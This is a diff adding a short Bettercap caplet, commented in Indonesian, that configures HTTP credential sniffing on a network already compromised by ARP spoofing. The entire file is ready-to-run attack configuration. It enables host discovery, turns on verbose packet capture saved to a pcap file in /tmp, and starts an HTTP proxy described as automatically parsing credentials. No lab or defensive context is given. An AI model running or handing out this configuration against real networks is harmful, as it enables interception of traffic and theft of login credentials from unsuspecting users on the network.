@@ -1,0 +1,28 @@
+# =============================================================================
+# Bettercap Caplet - HTTP Credential Sniffer Only (No ARP Spoof)
+# =============================================================================
+# Caplet ini hanya melakukan sniffing tanpa ARP Spoofing.
+# Berguna jika ARP Spoofing sudah dijalankan terpisah (via arp_spoof.py)
+# atau untuk menangkap traffic pada jaringan yang sudah di-MITM.
+#
+# Penggunaan:
+#   sudo bettercap -iface <INTERFACE> -caplet sniff_only.cap
+# =============================================================================
+
+# Aktifkan discovery
+net.probe on
+sleep 2
+net.show
+
+# Aktifkan sniffer - simpan ke pcap untuk analisis Wireshark
+set net.sniff.verbose true
+set net.sniff.local true
+set net.sniff.output /tmp/bettercap-sniff.pcap
+net.sniff on
+
+# Aktifkan HTTP proxy untuk otomatis parsing kredensial
+http.proxy on
+
+# Log events
+set events.stream.output /tmp/bettercap-sniff-events.log
+events.stream on
